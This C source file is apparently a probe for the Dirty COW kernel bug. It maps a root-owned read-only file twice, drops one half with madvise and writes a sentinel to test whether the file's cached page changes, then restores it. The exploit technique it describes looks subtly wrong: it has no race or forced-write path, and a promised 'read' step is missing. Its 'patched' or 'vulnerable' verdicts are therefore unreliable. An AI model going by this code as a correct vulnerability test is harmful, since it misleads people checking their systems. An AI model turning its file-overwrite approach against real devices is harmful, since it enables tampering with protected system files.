#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>

/* Dirty COW, the OTHER code path: the double-map + madvise(MADV_DONTNEED) vector.
 *
 * dcow_probe2 closed the ptrace/get_user_pages path (FOLL_FORCE pokes now copy).  The
 * fault path is a different fix (handle_pte_fault's VM_FAULT_WRITE bookkeeping), so it
 * has to be tested on its own -- and this one needs neither ptrace nor write permission
 * on the target file: a MAP_PRIVATE mapping may be PROT_WRITE even from an O_RDONLY fd.
 *
 * Layout: map [0,2P) read-only private at offset 0, then overlay [P,2P) read/write
 * private ALSO at offset 0, so the two halves address the same page-cache page.
 * Drop the writable half's page with MADV_DONTNEED and write again:
 *   vulnerable -> the refault hands back the shared page-cache page, so the read-only
 *                 half of the SAME mapping changes (observable right here);
 *   patched    -> a private copy is made, the read-only half keeps the file's bytes.
 * Controls: (a) a write to the writable half WITHOUT madvise must not be visible in the
 * read-only half (that is just normal COW, so a "yes" there would mean a broken ruler);
 * (b) we restore the original bytes through the same path, so a vulnerable kernel is
 * left with the file's cached page exactly as it was -- page cache only, no partition.
 *
 * usage: dcow_probe3 [path]     default /system/build.prop (root 0644, nothing execs it)
 */
#define PAGE 0x1000

int main(int argc, char **argv)
{
    const char *path = argc > 1 ? argv[1] : "/system/build.prop";
    struct stat st;
    unsigned char *base, *rw;
    unsigned char orig[8], sent[8];
    int fd, vulnerable = -1;
    off_t foff;

    setvbuf(stdout, NULL, _IONBF, 0);
    if (stat(path, &st)) { printf("stat %s: %s\n", path, strerror(errno)); return 1; }
    if (st.st_size < 2 * (off_t)PAGE) { printf("file too small (%lld)\n", (long long)st.st_size); return 1; }
    foff = 2 * PAGE;                       /* well past the header, still one page */
    printf("target %s size=%lld mode=%o uid=%d, testing page at offset %lld\n",
           path, (long long)st.st_size, st.st_mode, st.st_uid, (long long)foff);

    fd = open(path, O_RDONLY);
    if (fd < 0) { printf("open: %s\n", strerror(errno)); return 1; }

    base = mmap(NULL, 2 * PAGE, PROT_READ, MAP_PRIVATE, fd, foff);
    if (base == MAP_FAILED) { printf("mmap ro: %s\n", strerror(errno)); close(fd); return 1; }
    rw = mmap(base + PAGE, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED, fd, foff);
    if (rw == MAP_FAILED) { printf("mmap rw overlay: %s\n", strerror(errno)); return 1; }
    printf("ro half=%p rw half=%p (same file offset %lld)\n", (void *)base, (void *)rw,
           (long long)foff);
    memcpy(orig, base, 8);
    printf("original word = %016lx\n", *(unsigned long *)orig);

    /* control (a): plain COW write, no madvise -- must NOT be visible in the ro half */
    memset(sent, 0x5A, 8);
    memcpy(sent, "ZOWCOW", 6);
    memcpy(rw, sent, 8);
    printf("control: write to rw half without madvise -> ro half now %016lx %s\n",
           *(unsigned long *)base,
           memcmp(base, sent, 8) == 0 ? "*** VISIBLE -> ruler broken (no COW at all) ***"
                                      : "invisible (normal COW, as expected)");
    *(unsigned long *)(void *)base; /* keep base volatile-ish */

    /* control (b): madvise the writable half away, refill it with a *read*, then write */
    if (madvise(rw, PAGE, MADV_DONTNEED)) printf("madvise failed: %s\n", strerror(errno));
    printf("before test write: ro half %016lx  rw half %016lx\n",
           *(unsigned long *)base, *(unsigned long *)(void *)rw);

    /* the test */
    memcpy(rw, sent, 8);
    printf("after madvise+write: ro half %016lx (sentinel %016lx, original %016lx)\n",
           *(unsigned long *)base, *(unsigned long *)sent, *(unsigned long *)orig);
    if (memcmp(base, sent, 8) == 0) {
        printf("==> SHARED PAGE-CACHE PAGE WAS WRITTEN  =>  ** DIRTY COW PRESENT **\n");
        vulnerable = 1;
    } else if (memcmp(base, orig, 8) == 0) {
        printf("==> ro half untouched: the fault copied the page  =>  patched\n");
        vulnerable = 0;
    } else
        printf("==> ro half shows something else entirely\n");

    if (vulnerable == 1) {
        memcpy(rw, orig, 8);
        if (madvise(rw, PAGE, MADV_DONTNEED) == 0) memcpy(rw, orig, 8);
        printf("RESTORE: ro half now %016lx (%s)\n", *(unsigned long *)base,
               memcmp(base, orig, 8) == 0 ? "original bytes back, no residue"
                                         : "!!! not restored");
    }
    printf("verdict: %s\n", vulnerable == 1 ? "VULNERABLE" :
                            vulnerable == 0 ? "not vulnerable" : "inconclusive");
    munmap(base, 2 * PAGE);
    close(fd);
    return vulnerable == 1 ? 0 : 2;
}
